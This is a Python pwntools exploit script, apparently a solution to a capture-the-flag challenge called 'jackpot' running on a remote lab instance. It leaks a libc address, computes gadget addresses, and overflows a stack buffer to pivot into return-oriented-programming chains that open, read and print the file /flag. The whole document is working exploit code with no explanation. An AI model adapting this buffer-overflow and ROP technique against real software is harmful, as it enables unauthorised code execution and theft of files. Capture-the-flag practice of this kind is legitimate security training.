from pwn import *

context.arch = 'amd64'
libc = ELF("./libc.so.6")
port = input("Create the instance & Enter the port number: ")
# r = process('./share/jackpot')
r = remote('10.105.0.21', port=port)

r.recvuntil(b'Give me your number: ')
r.sendline(b'31')
r.recvuntil(b'Here is your ticket 0x')
leak_libc = int(r.recvline()[:-1], 16)
print("leak_libc: ", hex(leak_libc))

libc_base = leak_libc - 0x29d90
print("libc_base: ", hex(libc_base))

pop_rax = libc_base + 0x45eb0
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx = libc_base + 0x796a2 # 有 pop rdx 可以直接用
syscall = libc_base + 0x91316
main_fn = 0x4013d4

data_base = 0x400000
bss_1 = 0x42f8 + data_base
bss_2 = 0x4300 + data_base

# Open file
ropc_open = flat([pop_rax, 2, pop_rdi, bss_1, pop_rsi, 0, syscall, main_fn])
# Read file
ropc_read = flat([pop_rax, 0, pop_rdi, 3, pop_rsi, bss_1 + 0x300, pop_rdx, 0x30, syscall, main_fn])
# Write file
ropc_write = flat([pop_rax, 1, pop_rdi, 1, pop_rsi, bss_1 + 0x300, pop_rdx, 0x30, syscall])

payload = b'a' * 0x70
flag_adjust = b'/flag'.ljust(0x8, b'\x00')

r.recvuntil(b'Sign your name: ')
r.send(payload + p64(bss_2) + p64(main_fn))
# raw_input()
payload = b'a' * 0x60 + b'a' * 0x8 + flag_adjust
r.send(payload + p64(bss_2 + 0xf8) + ropc_open)
raw_input()
r.send(payload + p64(bss_2 + 0x200) + ropc_read)
# raw_input()
r.send(payload + p64(bss_2 + 0x300) + ropc_write)
r.interactive()